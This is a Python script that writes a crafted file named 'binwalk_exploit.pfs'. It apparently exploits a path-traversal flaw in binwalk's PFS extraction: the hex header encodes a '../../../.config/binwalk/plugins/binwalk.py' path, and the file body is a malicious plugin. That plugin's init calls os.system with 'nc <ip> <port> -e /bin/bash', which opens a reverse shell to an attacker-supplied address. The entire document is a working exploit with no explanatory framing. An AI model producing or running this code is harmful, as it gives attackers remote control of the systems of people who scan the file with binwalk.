ip = input("Insert destination IP Address: ")
port = input("Insert destination port: ")

header_pfs = bytes.fromhex(
    "5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e7"
    "7616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000"
    "0000000000000000000000000000000000000000000000000000000000000000000000000"
    "0000000000000000000000000000000000000000000000000000000000000000000003412"
    "0000a0000000c100002e"
)
reverse_shell = f"nc {ip} {port} -e /bin/bash 2>/dev/null &"
malware = [
    'import binwalk.core.plugin\n',
    'import os\n', 
    'class MaliciousExtractor(binwalk.core.plugin.Plugin):\n',
    '    def init(self):\n',
    f'        os.system("{reverse_shell}")\n',
]

with open("binwalk_exploit.pfs", "wb") as f:
    f.write(header_pfs)
    for line in malware:
        f.write(line.encode("utf-8"))
